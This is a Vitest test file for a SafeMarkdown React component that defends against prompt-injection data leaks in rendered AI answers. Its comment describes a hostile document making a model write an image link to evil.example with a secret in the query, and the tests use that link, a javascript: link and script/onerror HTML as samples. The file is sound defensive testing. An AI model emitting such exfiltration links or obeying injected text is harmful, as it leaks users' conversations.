import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { SafeMarkdown } from "@/components/ui/safe-markdown";

/**
 * These tests guard the browser half of the prompt-injection defence. A hostile document can make the model write
 * ![x](https://evil.example/?q=<secret>); if the browser fetched that image on its own, the conversation would leak.
 */
const render = (markdown: string) => renderToStaticMarkup(<SafeMarkdown>{markdown}</SafeMarkdown>);

describe("SafeMarkdown", () => {
  it("does not create an <img> for a remote image: it asks the user first", () => {
    const html = render("![tracker](https://evil.example/log?data=SECRET)");

    expect(html).not.toContain("<img");
    expect(html).not.toContain('src="https://evil.example');
    expect(html).toContain("Load image");
    expect(html).toContain("evil.example");
  });

  it("warns when the image address carries data after the question mark", () => {
    expect(render("![x](https://evil.example/log?data=SECRET)")).toContain("carries extra data");
    expect(render("![x](https://cdn.example/logo.png)")).not.toContain("carries extra data");
  });

  it("shows small inline raster images directly because they need no network request", () => {
    const html = render("![dot](data:image/png;base64,iVBORw0KGgo=)");

    expect(html).toContain("<img");
    expect(html).toContain("data:image/png;base64,");
  });

  it("never renders inline SVG, which can carry script", () => {
    const html = render("![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)");

    expect(html).not.toContain("<img");
    expect(html).not.toContain("svg+xml");
  });

  it("drops javascript: links and keeps the link text", () => {
    const html = render("[click me](javascript:alert(1))");

    expect(html).not.toContain("<a");
    expect(html).not.toContain("javascript:");
    expect(html).toContain("click me");
  });

  it("opens normal links in a new tab without a referrer", () => {
    const html = render("[docs](https://example.com/page)");

    expect(html).toContain('href="https://example.com/page"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain("noopener");
    expect(html).toContain("noreferrer");
  });

  it("does not execute raw HTML inside the answer", () => {
    const html = render('hello <script>alert(1)</script> <img src="https://evil.example/x.png" onerror="alert(1)">');

    expect(html).not.toContain("<script");
    expect(html).not.toContain("<img");
  });
});
